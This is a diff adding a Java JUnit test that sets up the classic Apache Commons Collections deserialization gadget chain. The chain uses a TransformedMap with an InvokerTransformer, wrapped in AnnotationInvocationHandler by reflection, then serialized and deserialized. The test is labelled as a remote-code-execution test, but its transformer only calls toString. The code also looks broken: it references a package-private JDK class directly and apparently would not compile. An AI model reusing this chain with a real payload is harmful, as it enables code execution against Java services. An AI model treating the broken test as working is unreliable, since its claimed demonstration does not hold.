@@ -1,0 +1,47 @@
+
+import org.apache.commons.collections4.map.TransformedMap;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.junit.Test;
+
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class InvokerTransformerTest {
+
+    @Test
+    public void testRemoteCodeExecutionWithInvokerTransformer() throws Exception {
+        // Set up a transformed map with an InvokerTransformer
+        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);
+        Map<Object, Object> innerMap = new HashMap<>();
+        Map<Object, Object> transformedMap = TransformedMap.transformingMap(innerMap, transformer);
+        transformedMap.put("test", "value");
+
+        // Create an AnnotationInvocationHandler instance with the transformed map
+        Constructor<?> constructor = sun.reflect.annotation.AnnotationInvocationHandler.class.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object instance = constructor.newInstance(Override.class, transformedMap);
+
+        // Serialize the instance
+        byte[] serializedData = serialize(instance);
+
+        // Deserialize the instance (this is where the arbitrary code execution can occur)
+        deserialize(serializedData);
+    }
+
+    private byte[] serialize(Object obj) throws IOException {
+        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
+             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        }
+    }
+
+    private Object deserialize(byte[] data) throws IOException, ClassNotFoundException {
+        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
+             ObjectInputStream ois = new ObjectInputStream(bais)) {
+            return ois.readObject();
+        }
+    }
+}
